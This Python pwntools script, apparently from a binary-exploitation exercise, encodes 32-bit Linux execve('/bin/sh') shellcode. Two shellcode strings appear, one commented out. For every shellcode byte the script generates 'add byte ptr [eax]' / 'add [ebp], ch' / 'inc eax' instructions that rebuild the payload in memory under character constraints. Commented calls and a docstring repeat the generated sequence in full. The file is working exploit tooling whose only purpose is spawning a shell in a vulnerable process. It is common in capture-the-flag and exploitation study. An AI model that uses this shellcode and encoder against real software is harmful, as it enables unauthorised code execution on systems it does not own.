#!/usr/bin/env python3

from pwn import *

import binascii, sys

# shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode = "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x6a\x0b\x58\x89\xe3\x31\xc9\x99\xcd\x80"
asm_code = ""
unicode_generator = ""
def test_asm(code):
	global asm_code, unicode_generator
	print ("> " + code)
	asm_code += '"' + code + '"'
	asm_code += '\n'
	bcode = binascii.hexlify(asm(code))

	hexstr = bcode.decode()
	opcode = ""
	for i in range(0, len(hexstr), 2):
		opcode += hexstr[i:i+2]
		opcode += " "
	unicode_generator += opcode
	print (opcode)



# "add $0x31, (%eax)\n\t"
# "add %ch, (%ebp)\n\t"
# "inc %eax\n\t"
for h in shellcode:
	b = (hex(ord(h)))# should be at&t syntax for gcc...
	print ('"addb ${}, (%eax);"'.format(b))
	print ('"addb %ch, (%ebp);"')
	print ('"inc %eax;"')
	print ('"addb %ch, (%ebp);"')
	# print ("test_asm(\"add byte ptr [eax], {}\")".format(b))
	# print ('test_asm("add byte ptr [ebp], ch")')
	# print ('test_asm("inc eax")')
	# print ('test_asm("add byte ptr [ebp], ch")')

sys.exit()
#intel grammar for pwntools
# test_asm("add byte ptr [eax], 0x31")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0xc0")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0x50")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0x68")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0x2f")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0x2f")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0x73")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0x68")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0x68")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0x2f")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0x62")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0x69")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0x6e")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0x89")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0xe3")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0x50")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0x53")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0x89")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0xe1")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0xb0")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0xb")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0xcd")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")
# test_asm("add byte ptr [eax], 0x80")
# test_asm("add byte ptr [ebp], ch")
# test_asm("inc eax")
# test_asm("add byte ptr [ebp], ch")

# print ("total code = {}".format(unicode_generator))
# print ("asm_code = {}".format(asm_code))

"""
"add byte ptr [eax], 0x31"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0xc0"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0x50"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0x68"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0x2f"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0x2f"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0x73"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0x68"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0x68"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0x2f"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0x62"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0x69"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0x6e"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0x89"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0xe3"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0x50"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0x53"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0x89"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0xe1"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0xb0"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0xb"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0xcd"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"
"add byte ptr [eax], 0x80"
"add byte ptr [ebp], ch"
"inc eax"
"add byte ptr [ebp], ch"

"""